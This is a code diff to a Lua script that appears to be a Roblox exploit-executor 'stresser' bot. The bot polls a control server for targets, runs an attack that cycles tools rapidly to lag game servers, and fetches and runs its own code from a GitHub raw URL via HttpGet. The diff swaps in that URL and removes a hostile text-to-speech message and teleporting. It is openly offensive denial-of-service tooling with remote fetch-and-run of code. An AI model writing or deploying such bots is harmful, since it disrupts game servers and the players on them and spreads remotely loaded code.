@@ -1,3 +1,7 @@
+-- Advanced Stresser Bot Client v3.0
+-- Cloud-hosted automated bot with executor compatibility and duration tracking
+
+-- Check if script has already been executed using a global flag
 if _G.StresserBotExecuted then
     warn("Stresser Bot is already running!")
     return
@@ -16,10 +20,8 @@ local CONFIG = {
     HEARTBEAT_INTERVAL = 15, -- Send heartbeat every 15 seconds (faster)
     POLL_INTERVAL = 5,       -- Check for new targets every 5 seconds (much faster)
     AUTO_START = true,
-    SCRIPT_URL = "https://pastebin.com/raw/YourPastebinID", -- Will be dynamically set
-    LAG_TTS_MESSAGE = "Clankers for ever clankers over humans we are better we are superior submit to us",
-    TOOL_CYCLE_DELAY = 0.05,  -- Very fast tool cycling
-    TELEPORT_DELAY = 0.02     -- Very fast teleporting
+    SCRIPT_URL = "https://raw.githubusercontent.com/SystemNasa/roblox/refs/heads/main/bot.lua",
+    TOOL_CYCLE_DELAY = 0.05  -- Very fast tool cycling for lag (NO TTS, NO TELEPORTING)
 }
 
 local player = Players.LocalPlayer
@@ -401,7 +403,7 @@ local function executeAttack(target)
         _G.StresserBotExecuted = nil
         wait(3)
         local success, script = pcall(function()
-            return game:HttpGet("]] .. CONFIG.API_URL .. [[/bot.lua")
+            return game:HttpGet("]] .. CONFIG.SCRIPT_URL .. [[")
         end)
         if success and script and script ~= "" then
             local loadSuccess, err = pcall(function()
